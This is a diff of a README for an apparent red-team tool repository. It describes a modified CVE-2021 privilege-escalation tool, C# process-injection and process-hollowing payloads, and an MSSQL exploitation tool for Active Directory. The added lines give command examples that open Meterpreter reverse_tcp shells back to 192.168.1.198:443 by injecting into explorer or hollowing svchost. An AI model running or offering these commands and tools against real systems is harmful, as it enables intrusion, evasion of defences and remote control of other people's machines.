@@ -25,10 +25,15 @@ Shakeitoff - Modification of https://github.com/jbaines-r7/shakeitoff (CVE-2021-
 Usage: shakeitoff.exe -m c:\users\user\shakeitoff\shakeitoff.msi -i c:\users\user\write\ -c c:\users\user\source\repos\d_invoke\inject.exe -p "C:\Program Files (x86)\Microsoft\Edge\Application\96.0.1054.53\elevation_service.exe"
 ````
 
-clinject - C# project source code for (IP + port + process) cli passed process injection payload.
+clinject - C# project source code for (IP + port + process) cli passed process injection payload. Use multi/handler with windows/x64/meterpreter/reverse_tcp
+````
+clinject.exe 192.168.1.198 443 explorer
+````
 
-clhollow - C# project source code for (IP + port + PPID + process) cli passed process hollowing payload.
-
+clhollow - C# project source code for (IP + port + process + parent-process) cli passed process hollowing payload. Use multi/handler with windows/x64/meterpreter/reverse_tcp
+````
+clhollow.exe 192.168.1.198 443 c:\\windows\\system32\\svchost.exe explorer 
+````
 sql - C# project source code for SQL.exe project for exploitation of MSSQL servers in AD.
 
 x64_met_staged_reversetcp_inject.exe - Command line args: IP PORT PROCESS_TO_INJECT(explorer)
